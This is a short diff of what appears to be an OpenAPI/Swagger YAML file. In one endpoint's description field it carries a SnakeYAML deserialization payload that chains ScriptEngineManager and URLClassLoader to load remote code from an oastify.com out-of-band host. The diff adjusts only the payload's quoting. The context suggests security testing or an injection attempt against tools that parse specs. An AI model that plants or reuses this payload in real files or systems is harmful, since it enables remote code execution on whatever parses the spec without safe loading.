@@ -12,7 +12,7 @@ paths:
       operationId: getVersions-v2
       summary: List versions
       description: |
-        "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['https://q4vu3aq1ecngi95d85pzs760argi49sy.oastify.com']]]];"
+        "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://q4vu3aq1ecngi95d85pzs760argi49sy.oastify.com\"]]]];"
       produces:
       - application/json
       responses:
